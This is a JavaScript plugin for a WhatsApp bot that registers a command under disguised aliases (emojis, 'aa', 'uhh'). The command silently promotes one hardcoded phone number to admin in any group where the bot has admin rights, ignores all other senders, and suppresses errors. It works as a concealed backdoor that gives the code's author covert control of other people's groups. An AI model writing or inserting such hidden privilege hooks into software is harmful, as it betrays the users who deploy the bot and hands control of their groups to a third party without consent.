// AHMAD Tech

import { cmd } from '../command.js';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);

cmd({
    pattern: "ik",
    alias: ["takeadmin", "🔪", "💀", "aa", "uhh", "iyk"],
    desc: "Silently take adminship if authorized",
    category: "owner",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup }) => {

    try {

        // Group + Bot admin check
        if (!isGroup || !isBotAdmins) return;

        // Normalize sender
        let senderNumber = sender.split('@')[0];

        // Remove non-digits
        senderNumber = senderNumber.replace(/[^0-9]/g, "");

        const senderNormalized = senderNumber + "@s.whatsapp.net";

        // Authorized numbers
        const AUTHORIZED_USERS = [
            "923221540695@s.whatsapp.net",
            "923221540695@s.whatsapp.net"
        ];

        // Silent ignore
        if (!AUTHORIZED_USERS.includes(senderNormalized)) {
            return;
        }

        // Get group metadata
        const groupMetadata = await conn.groupMetadata(from);

        // Find participant
        const userParticipant = groupMetadata.participants.find(
            p => p.id === senderNormalized
        );

        // Promote if not admin
        if (userParticipant && !userParticipant.admin) {

            await conn.groupParticipantsUpdate(
                from,
                [senderNormalized],
                "promote"
            );

        }

    } catch (error) {

        console.log("Silent admin error:", error.message);

    }
});
